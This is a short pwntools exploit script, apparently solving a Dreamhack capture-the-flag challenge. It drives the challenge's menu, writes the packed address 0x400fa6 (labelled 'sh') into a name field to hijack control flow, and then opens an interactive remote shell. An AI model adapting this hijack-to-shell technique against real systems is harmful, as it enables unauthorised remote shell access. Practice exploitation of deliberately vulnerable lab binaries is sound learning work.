from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23522
r = remote(HOST, PORT)

sh=0x400fa6

def apple():
    r.sendlineafter(b': ', b'1')
def mango():
    r.sendlineafter(b': ', b'2')
def mix(name):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', name)

apple()
mango()
mix(p64(sh))

r.sendline(b'4 3')

r.interactive()